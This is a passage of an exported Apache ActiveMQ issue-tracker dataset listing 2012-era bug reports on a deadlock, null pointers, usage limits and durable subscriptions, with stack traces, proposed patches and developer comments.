2012-09-14 10:47:53,927 | INFO  | ActiveMQ 5.7-SNAPSHOT JMS Message Broker (localhost, ID:davsclaus.lan-60396-1347612433848-0:1) stopped | org.apache.activemq.broker.BrokerService | Thread-18
2012-09-14 10:47:54,015 | INFO  | Connector openwire Stopped | org.apache.activemq.broker.TransportConnector | ActiveMQ ShutdownHook
2012-09-14 10:47:54,015 | INFO  | ActiveMQ 5.7-SNAPSHOT JMS Message Broker (localhost, ID:davsclaus.lan-60396-1347612433848-0:1) stopped | org.apache.activemq.broker.BrokerService | ActiveMQ ShutdownHook
{code};;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Web demo - Receive a message page renders an error page,AMQ-4043,12607054,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,davsclaus,davsclaus,davsclaus,11/Sep/12 12:58,19/Sep/12 09:33,14/Jul/23 05:43,19/Sep/12 09:33,5.6.0,,,,,5.7.0,,,Samples,,,,0,,,,,,,,,"See screenshot.

This fails on AMQ 5.6.0 also.

When you click that link you get this error. Also if you send a message beforehand.",,davsclaus,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"11/Sep/12 12:59;davsclaus;webdemo.png;https://issues.apache.org/jira/secure/attachment/12544635/webdemo.png",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,249742,,,Tue Sep 18 15:16:14 UTC 2012,,,,,,,,,,,"0|i0ah7z:",59063,,,,,,,,,,,,,,,,,,,,,"18/Sep/12 15:16;davsclaus;Ah its AMQ-3940 which turns the default content type into text/xml.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Null pointer in class KahaDBStore programmed,AMQ-4035,12606867,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,mtmvetter,mtmvetter,10/Sep/12 13:29,11/Sep/12 03:28,14/Jul/23 05:43,11/Sep/12 03:28,,,,,,5.7.0,,,Message Store,,,,0,,,,,,,,,"The method ""protected void doAcknowledge(ConnectionContext context, String subscriptionKey, MessageId messageId, MessageAck ack)"" in KahaDBStore, line 705, contains a get-operation on parameter ""ack"" in line 711:
command.setTransactionInfo(transactionIdTransformer.transform(ack.getTransactionId()));
Unfortunately, the method is called from inside with setting ack=null!
(same class, method ""run"" of internal class StoreTopicTask, line 1268):
this.topicStore.doAcknowledge(context, key, this.message.getMessageId(), null);
Thus, a null pointer exception is guaranteed, whenever the run-method is called (which is the case, for instance, when topic messages are synchronized in a network cluster).","Windows 7, Active MQ 5.6.0",mtmvetter,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,249746,,,Tue Sep 11 03:28:51 UTC 2012,,,,,,,,,,,"0|i0ah8v:",59067,,,,,,,,,,,,,,,,,,,,,"11/Sep/12 03:28;tabish;Added check for null before using the ack value.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
BrokerFactoryBean logs error when starting a non persistent broker,AMQ-4031,12606696,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,davsclaus,johno,johno,08/Sep/12 00:09,19/Nov/12 11:41,14/Jul/23 05:43,08/Sep/12 09:10,5.6.0,,,,,5.7.0,,,Broker,,,,0,,,,,,,,,"When starting a non persistent broker an error is logged explaining that the temp store will not accept any data when used..

{code}2012-09-08 02:05:45,457 ERROR [main] (org.apache.activemq.broker.BrokerService) Temporary Store limit is 0 mb, whilst the max journal file size for the temporary store is: 32 mb, the temp store will not accept any data when used.{code}",,johno,mcekovic,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"08/Sep/12 00:10;johno;AMQ-2834.zip;https://issues.apache.org/jira/secure/attachment/12544330/AMQ-2834.zip","08/Sep/12 00:20;johno;AMQ-4031_proposal.patch;https://issues.apache.org/jira/secure/attachment/12544334/AMQ-4031_proposal.patch",,,,,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,249748,,,Mon Nov 19 11:41:55 UTC 2012,,,,,,,Patch Available,,,,"0|i0ah9b:",59069,,,,,,,,,,,,,,,,,,,,,"08/Sep/12 00:10;johno;Attached test case.;;;","08/Sep/12 00:20;johno;Attached patch proposal.;;;","19/Nov/12 11:41;mcekovic;This issue is present in version 5.7 too;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Receiving event while disconnecting -> AMQ deadlock -> ""Already connected"" error",AMQ-4022,12606236,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,gabrielg,gabrielg,05/Sep/12 12:37,19/Sep/12 09:13,14/Jul/23 05:43,19/Sep/12 09:13,5.5.1,,,,,5.8.0,,,STOMP,,,,0,,,,,,,,,"Executive summary
---
When an event is about to be delivered to a client while that client simultaneously sends a DISCONNECT message, there's a risk for a deadlock between two threads in ActiveMQ, causing no DISCONNECT receipt as well as ""Already connected"" error if another client connects with the same client ID.


Details
---
Here's steps to reproduce, using STOMP, tho it's possible that this issue exists for other protocols also, since the deadlock happens in broker/TransportConnection.java. I could reproduce the error easily with these steps, tho it's entirely possible that some of the steps aren't strictly required but rather provides certain needed timing.

1) Connect to ActiveMQ using STOMP

2) Send a SUBSCRIBE message with destination=/topic/foo, without asking for a receipt. No other options sent in message. 

3) Send a message to /topic/foo, without asking for a receipt. Note: It's important that the message is auto-acked by the server.

4) Wait 10ms for message

5) Go right ahead and send DISCONNECT message, asking for a receipt.

5.1) About 20% of the time, the message is never received, nor is the DISCONNECT receipt.

5.2) Run 'jstack -p <activemq pid>', watch how the JVM prints info on stdout about a deadlock between two threads.


Test script
---
Apply the small patch to the perl library Net/Stomp.pm
It's a naive minimal patch to make it wait for a receipt for the DISCONNECT message. It will actually just wait for any frame to arrive and won't check what it is, but it's enough for this test.

Run amqtest.pl a few times. A non-buggy run completes almost immediately. A buggy run hangs the script during disconnect.


Workaround
---
-When sending the SUBSCRIBE with receipt requested, and waiting for the receipt before sending the SEND, I was unable to reproduce the issue, even after running the script 100000 times.-
No, it turns out that the workaround suggested above does not completely eliminate the problem. It probably just introduces a large enough delay to almost always avoid the race condition. After 30000 additional test runs with the script the error occurred again.",SLES11-SP1 x86_64,gabrielg,lionel.cons,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"11/Sep/12 13:40;gabrielg;AMQ_4022_possible_fix.diff;https://issues.apache.org/jira/secure/attachment/12544640/AMQ_4022_possible_fix.diff","05/Sep/12 12:38;gabrielg;Net_Stomp.pm.diff;https://issues.apache.org/jira/secure/attachment/12543843/Net_Stomp.pm.diff","05/Sep/12 12:38;gabrielg;amqtest.pl;https://issues.apache.org/jira/secure/attachment/12543844/amqtest.pl",,,,,,,,,,,,,,,,,,,3.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,249861,,,Wed Sep 19 09:13:45 UTC 2012,,,,,,,Patch Available,,,,"0|i0al9r:",59719,,,,,,,,,,,,,,,,,,,,,"11/Sep/12 08:42;tabish;Have you tried using the 5.6.0 release of ActiveMQ or a 5.7 SNAPSHOT?  There were a lot of fixes and improvements in the STOMP transport between 5.5.1 and 5.6;;;","11/Sep/12 13:06;gabrielg;Thanks for the reply Timothy. 

We haven't tried with 5.6 or 5.7 for this issue, no. But, I have good news: I think I just found the problem and am currently testing a fix. 

I found that the problem is a deadlock in broker.TransportConnection. Once that was clear, the fix was rather easy. I'm currently running the test script and am hopeful that there'll be no problems. If everything's ok I'll get back to you with a patch. 

I checked the 5.6 branch and can confirm that the issue does exist there also. Haven't checked 5.7.;;;","11/Sep/12 13:38;gabrielg;jstack output (partial) from when the problem had been reproduced:

{noformat}
""ActiveMQ Transport: tcp:///127.0.0.1:59675"" daemon prio=10 tid=0x00000000402bf000 nid=0x1bf0 waiting for monitor entry [0x00007fffcc787000]
   java.lang.Thread.State: BLOCKED (on object monitor)
    at org.apache.activemq.broker.TransportConnection.removeConsumerBrokerExchange(TransportConnection.java:1473)
    - waiting to lock <0x00000000c3cf2838> (a java.util.HashMap)
    at org.apache.activemq.broker.TransportConnection.processRemoveConsumer(TransportConnection.java:684)
    at org.apache.activemq.broker.TransportConnection.processRemoveSession(TransportConnection.java:721)
    at org.apache.activemq.broker.TransportConnection.processRemoveConnection(TransportConnection.java:840)
    - locked <0x00000000c3ce8e98> (a org.apache.activemq.broker.jmx.ManagedTransportConnection)
    at org.apache.activemq.command.RemoveInfo.visit(RemoveInfo.java:77)
    at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:336)
    at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:189)
    at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:69)
    at org.apache.activemq.transport.stomp.StompTransportFilter.sendToActiveMQ(StompTransportFilter.java:81)
    at org.apache.activemq.transport.stomp.ProtocolConverter.sendToActiveMQ(ProtocolConverter.java:166)
    at org.apache.activemq.transport.stomp.ProtocolConverter.onStompDisconnect(ProtocolConverter.java:586)
    at org.apache.activemq.transport.stomp.ProtocolConverter.onStompCommand(ProtocolConverter.java:220)
    at org.apache.activemq.transport.stomp.StompTransportFilter.onCommand(StompTransportFilter.java:70)
    at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)
    at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:232)
    at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:204)
    at java.lang.Thread.run(Thread.java:662)

""ActiveMQ Connection Dispatcher: /127.0.0.1:59675"" daemon prio=10 tid=0x00000000402be000 nid=0x1bef waiting for monitor entry [0x00007fffcae6e000]
   java.lang.Thread.State: BLOCKED (on object monitor)
    at org.apache.activemq.broker.TransportConnection.lookupConnectionState(TransportConnection.java:1537)
    - waiting to lock <0x00000000c3ce8e98> (a org.apache.activemq.broker.jmx.ManagedTransportConnection)
    at org.apache.activemq.broker.TransportConnection.getConsumerBrokerExchange(TransportConnection.java:1451)
    - locked <0x00000000c3cf2838> (a java.util.HashMap)
    at org.apache.activemq.broker.TransportConnection.processMessageAck(TransportConnection.java:572)
    at org.apache.activemq.command.MessageAck.visit(MessageAck.java:229)
    at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:336)
    at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:189)
    at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:69)
    at org.apache.activemq.transport.stomp.StompTransportFilter.sendToActiveMQ(StompTransportFilter.java:81)
    at org.apache.activemq.transport.stomp.StompSubscription.onMessageDispatch(StompSubscription.java:79)
    at org.apache.activemq.transport.stomp.ProtocolConverter.onActiveMQCommand(ProtocolConverter.java:636)
    at org.apache.activemq.transport.stomp.StompTransportFilter.oneway(StompTransportFilter.java:58)
    at org.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:40)
    - locked <0x00000000c3cf1f10> (a java.lang.Object)
    at org.apache.activemq.broker.TransportConnection.dispatch(TransportConnection.java:1384)
    at org.apache.activemq.broker.TransportConnection.processDispatch(TransportConnection.java:929)
    at org.apache.activemq.broker.TransportConnection.iterate(TransportConnection.java:965)
    at org.apache.activemq.thread.DedicatedTaskRunner.runTask(DedicatedTaskRunner.java:104)
    at org.apache.activemq.thread.DedicatedTaskRunner$1.run(DedicatedTaskRunner.java:42)
{noformat}

{noformat}
Found one Java-level deadlock:
=============================
""ActiveMQ Transport: tcp:///127.0.0.1:59675"":
  waiting to lock monitor 0x0000000040ad8440 (object 0x00000000c3cf2838, a java.util.HashMap),
  which is held by ""ActiveMQ Connection Dispatcher: /127.0.0.1:59675""
""ActiveMQ Connection Dispatcher: /127.0.0.1:59675"":
  waiting to lock monitor 0x00000000403568a8 (object 0x00000000c3ce8e98, a org.apache.activemq.broker.jmx.ManagedTransportConnection),
  which is held by ""ActiveMQ Transport: tcp:///127.0.0.1:59675""
{noformat}

This method (in broker/TransportConnection.java) is one of the culprits, and feels like a good place to break the deadlock:
{noformat}
    private ConsumerBrokerExchange getConsumerBrokerExchange(ConsumerId id) {
        ConsumerBrokerExchange result = consumerExchanges.get(id);
        if (result == null) {
            synchronized (consumerExchanges) {
                result = new ConsumerBrokerExchange();
                TransportConnectionState state = lookupConnectionState(id);
                context = state.getContext();
                result.setConnectionContext(context);
                SessionState ss = state.getSessionState(id.getParentId());
                if (ss != null) { 
                    ConsumerState cs = ss.getConsumerState(id);
                    if (cs != null) {
                        ConsumerInfo info = cs.getInfo();
                        if (info != null) { 
                            if (info.getDestination() != null && info.getDestination().isPattern()) {
                                result.setWildcard(true);
                            }   
                        }   
                    }   
                }   
                consumerExchanges.put(id, result);
            }   
        }   
        return result;
    }   
{noformat}

It holds the consumerExchanges lock, calls lookupConnectionState, which is 'synchronized', while another thread is within another 'synchronized' method and calls removeConsumerBrokerExchange, which tries to take consumerExchanges.

Something like this instead would solve it, basically minimizing the locking to only the get (which wasn't protected at all previously) and the put. The only possible problem is if two callers enter getConsumerBrokerExchange at the same time, both enter the ""if (result == null)"" block and then 'put' the result, causing one to overwrite the result of the other. Without knowing the code it's a bit hard to say, but I'd say that it looks likely that the double-put race condition isn't a problem in this case. It wouldn't do any harm, as far as I can see. What do you think?
{noformat}
    private ConsumerBrokerExchange getConsumerBrokerExchange(ConsumerId id) {
        ConsumerBrokerExchange result;
        synchronized (consumerExchanges) {
            result = consumerExchanges.get(id);
        }
        if (result == null) {
            result = new ConsumerBrokerExchange();
            TransportConnectionState state = lookupConnectionState(id);
            context = state.getContext();
            result.setConnectionContext(context);
            SessionState ss = state.getSessionState(id.getParentId());
            if (ss != null) {
                ConsumerState cs = ss.getConsumerState(id);
                if (cs != null) {
                    ConsumerInfo info = cs.getInfo();
                    if (info != null) {
                        if (info.getDestination() != null && info.getDestination().isPattern()) {
                            result.setWildcard(true);
                        }
                    }
                }
            }
            synchronized (consumerExchanges) {
                consumerExchanges.put(id, result);
            }
        }
        return result;
    }
{noformat}

I'll attach a patch.;;;","11/Sep/12 13:40;gabrielg;Attached patch is a possible fix. With this applied, I haven't been able to reproduce the problem.;;;","17/Sep/12 13:57;gabrielg;Updated title and description with clearer information, since this issue isn't really about SUBSCRIBE but rather DISCONNECT deadlocking with auto-acking of an event inside Active MQ.;;;","19/Sep/12 09:13;tabish;This was fixed before the v5.6.0 release and is no longer an issue, the code has been refactored to avoid this particular deadlock scenario.  Upgrade to a newer broker version and you won't run into this any longer.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Demand Forwarding Bridge uses value of asyncDispatch for advisory consumers,AMQ-4017,12606100,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,raulvk,raulvk,04/Sep/12 15:41,05/Sep/12 09:24,14/Jul/23 05:43,05/Sep/12 09:24,5.5.1,5.6.0,,,,5.7.0,,,Broker,,,,0,advisory,dispatch,network,networkConnector,,,,,"The value of the dispatchAsync option on the networkConnector element is used when creating the ConsumerInfo command that we dispatch to the remote broker with the aim of subscribing to demand-related consumer advisories.

A 'false' value means we risk blocking the remote broker if the local->remote broker connection is blocked.",,gtully,raulvk,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-3985,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,249715,,,Wed Sep 05 09:24:47 UTC 2012,,,,,,,,,,,"0|i0agnj:",58971,,,,,,,,,,,,,,,,,,,,,"04/Sep/12 15:43;raulvk;IRC chat record with gtully:

{quote}
17:14:06 raul: hey, quick question... what is the dispatchAsync on the network connector used for? is it only used when listening for advisories?
17:24:05 gtully: raul: it is also used for local proxy consumers that will do the forwarding... in fact, I don't think we should use that option for the advisory consumer, it should always be async as a block would propagate back to the broker
17:29:30 raul: gtully, I think it's being used for the advisory consumer at least on 5.5.1: DemandForwardingSubscription.startRemoteBridge, inside the 'demandConsumerInfo' ConsumerInfo
17:30:35 gtully: raul: it is, think that is a bug waiting to happen if folks use dispatchAsync=false
{quote};;;","05/Sep/12 09:24;gtully;fix in http://svn.apache.org/viewvc?rev=1381095&view=rev

the network connector advisory consumer is always asyncDispatch
the config flag only effects the local proxy consumers that forward;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
BrokerService TempUsage and StoreUsage Default Values Are Incorrect,AMQ-4007,12605548,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Trivial,Fixed,davsclaus,ldawson7777,ldawson7777,30/Aug/12 16:17,01/Sep/12 15:00,14/Jul/23 05:43,01/Sep/12 15:00,5.6.0,,,,,5.7.0,,,Broker,,,,0,,,,,,,,,"Looking at the code in BrokerService.getSystemUsage(), the limits set for the TempUsage (50GB) and the StoreUsage (100GB) are incorrectly calculated:

{code}
systemUsage.getTempUsage().setLimit(1024L * 1024 * 1000 * 50); // 50 GB                                                           
systemUsage.getStoreUsage().setLimit(1024L * 1024 * 1000 * 100); // 100 GB
{code}

They should be:

{code}
systemUsage.getTempUsage().setLimit(1024L * 1024 * 1024 * 50); // 50 GB                                                           
systemUsage.getStoreUsage().setLimit(1024L * 1024 * 1024 * 100); // 100 GB
{code}",,davsclaus,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,249761,,,Sat Sep 01 15:00:04 UTC 2012,,,,,,,,,,,"0|i0ahc7:",59082,Regression,,,,,,,,,,,,,,,,,,,,"01/Sep/12 15:00;davsclaus;Thanks for reporting.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Instance of BlobTransferPolicy and its URL are being shared among multiple messages,AMQ-4002,12605353,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Critical,Fixed,davsclaus,libert,libert,29/Aug/12 08:37,08/Sep/12 11:38,14/Jul/23 05:43,08/Sep/12 11:38,5.6.0,,,,,5.7.0,,,Transport,,,,0,BlobTransferPolicy,ftp,url,,,,,,"Bug we encountered: using BlobMessage (FTP backend) and individual acknowledge, URL of BlobTransferPolicy was shared among messages following the acknowledge of messages.

Example: 1 queue, 1 consumer, 1 producer, prefetch limit 5 messages

- Producer generated 10 messages
- Consumer received and processed (but do not ack) 5 messages
- Consumer acked the 5 messages in a row
- Consumer received 5 more messages and the first one shared the same BlobTransferPolicy and FTP URL that the last acknowledged messages.

We tested the attached (one line) patch in our production server for more than one month and it did not the show the bug or any new one.
","Tested on Debian Lenny 64
ActiveMQ 5.6.0
",davsclaus,libert,tabish,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"29/Aug/12 08:37;libert;amq_patch.diff;https://issues.apache.org/jira/secure/attachment/12542905/amq_patch.diff",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,249765,,,Sat Sep 08 11:03:41 UTC 2012,,,,,,,Patch Available,,,,"0|i0ahd3:",59086,,,,,,,,,,,,,,,,,,,,,"29/Aug/12 14:22;tabish;Recommend you provide a JUnit test case to show the issue and protect the fix into the future.;;;","08/Sep/12 09:21;davsclaus;Thanks for the patch. Having test it in your production system for 1+ months is great.;;;","08/Sep/12 11:03;davsclaus;I am fixing this in the BlobUploader and BlobDownloader so they do a copy of the policy.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
activemq karaf feature uses different commons-lang than pom,AMQ-4001,12605227,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,janstey,janstey,janstey,28/Aug/12 13:57,28/Aug/12 14:03,14/Jul/23 05:43,28/Aug/12 14:03,5.6.0,,,,,5.7.0,,,,,,,0,,,,,,,,,activemq-karaf/src/main/resources/features.xml uses org.apache.servicemix.bundles.commons-lang 2.4_4 whereas the root pom uses commons-lang 2.6. These should be aligned.,,janstey,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"28/Aug/12 13:58;janstey;AMQ-4001.patch;https://issues.apache.org/jira/secure/attachment/12542772/AMQ-4001.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,246241,,,Tue Aug 28 14:03:10 UTC 2012,,,,,,,,,,,"0|i07j8n:",41884,,,,,,,,,,,,,,,,,,,,,"28/Aug/12 13:58;janstey;Simple patch to fix issue.;;;","28/Aug/12 14:03;janstey;[janstey@duffman trunk]$ svn ci -m ""AMQ-4001 - align commons-lang dependency""
Sending        activemq-karaf/src/main/resources/features.xml
Transmitting file data .
Committed revision 1378139.
;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Durable subscription not getting unregistered on networked broker,AMQ-4000,12605217,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,ceposta,tmielke,tmielke,28/Aug/12 12:46,07/Oct/15 12:02,14/Jul/23 05:43,21/Jul/14 12:44,5.6.0,,,,,5.10.0,,,,,,,0,durable_subscription,networks,,,,,,,"In a network of two brokers, a durable subscription is correctly propagated across to the remote broker. However when the consumer unsubscribes from the durable subscription again, it is only removed on the local broker but not on the remote broker. The remote broker keeps its durable subscription alive.

As a consequence messages sent to the topic destination on the remote broker for which the durable subscriptions existed, are passed on to the local broker, although there is no active subscription on the local broker. The local broker will discard these msgs but unnecessary traffic has already occurred on the network bridge.","network of brokers, durable topic subscriptions.",ceposta,dejanb,gtully,jira-bot,kearls,lukejackson,tabish,tmielke,zgl,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"28/Aug/12 12:50;tmielke;JUnitTest.patch;https://issues.apache.org/jira/secure/attachment/12542762/JUnitTest.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,253886,,,Wed Oct 07 12:02:59 UTC 2015,,,,,,,,,,,"0|i0ea9z:",81427,,,,,,,,,,,,,,,,,,,,,"28/Aug/12 12:50;tmielke;Attaching patch file containing JUnit test but no fix yet. 
;;;","29/Aug/12 12:44;tmielke;org.apache.activemq.advisory.AdvisoryBroker does not override the method 
public void removeSubscription(ConnectionContext context, RemoveSubscriptionInfo info);

of class org.apache.activemq.broker.BrokerFilter.

Its the AdvisoryBroker that is responsible for creating and firing the advisory message to inform other brokers in the network that a durable subscription got removed. 
So AdvisoryBroker needs to override method removeSubscription() accordingly. 
;;;","12/Feb/13 02:33;ceposta;Before this gets fixed, I suppose the workaround is to use offlineDurableSubscriberTimeout? ;;;","15/Feb/13 05:24;ceposta;Thanks Torsten for the good test. Fixed with r1446447.
Give it a shot on your end when you get a sec.;;;","15/Feb/13 11:24;gtully;@Christian looking at that fix i think it may be may be missing the conduit nature if durable subs. So with two durable subs and one unsub, i think we will loose the bridged sub. Maybe just checkup on that. Not sure if there are failing tests that will show that.
but my thought is that the conduit durables need to be reference counted w.r.t to durable unsubscribes vs disconnects.;;;","15/Feb/13 14:54;ceposta;Gary, that sounds right... I missed it. Let me write the unit test and get that in there;;;","20/Feb/13 21:58;gtully;I reverted the change, we can revisit.;;;","26/Feb/13 21:04;kearls;FYI, DurableSubInBrokerNetworkTest.testDurableSubNetwork is currently failing
;;;","15/May/13 12:36;dejanb;As a first step we need a proper way to send advisories when durable sub unsubscribes. I started with Christian's solution but noted a couple of cases that were not covered, like sending advisory when unsubscribing using JMX and after restarting a broker. I committed a new fix in svn revision 1482790. I'll now proceed to trying to implement the rest of this feature.;;;","17/May/13 14:33;dejanb;Pushed another commit 1483827. It keeps track of durable subs in demand suscription and unregister local durable when there's no remote durable subs any more. The DurableSubInBrokerNetworkTest now passes but there is more work in this area. We need to make sure we have a proper state after broker restart and work well with mix of non-durable and durable subs on the same topic.;;;","17/May/13 14:44;tabish;In the latest commit you added a new field to ConsumerInfo clientId with the openwire annotation set to version=1, shouldn't that be version=10 in order to keep backwards compatibility? ;;;","17/May/13 16:29;dejanb;Thanks for spotting! Fixed and bumped operwire version to 10 in svn commit 1483902;;;","07/Mar/14 12:10;gtully;@Christian - this looks done but there is a test that is excluded in the unit-test pom as broken that maybe can come back into the fold.
{code}<!-- https://issues.apache.org/jira/browse/AMQ-4000 -->
                <exclude>**/DurableSubInBrokerNetworkTest.*</exclude>{code};;;","21/Jul/14 12:44;gtully;test enabled on trunk - fix looks complete
http://git-wip-us.apache.org/repos/asf/activemq/commit/0ebbd5d9;;;","06/Oct/15 11:17;jira-bot;Commit dc06c8dc7540233aad6722afe554c2ea505754e2 in activemq's branch refs/heads/master from [~gtully]
[ https://git-wip-us.apache.org/repos/asf?p=activemq.git;h=dc06c8d ]

https://issues.apache.org/jira/browse/AMQ-5994 https://issues.apache.org/jira/browse/AMQ-4000 - proper fix for duplicate sub info from the store on recovery failure from AMQ2149Test. Additional test from Christopher L
;;;","07/Oct/15 12:02;jira-bot;Commit 8ef31b91e6db5a10cebc79785f075649d8ba0a56 in activemq's branch refs/heads/activemq-5.12.x from [~gtully]
[ https://git-wip-us.apache.org/repos/asf?p=activemq.git;h=8ef31b9 ]

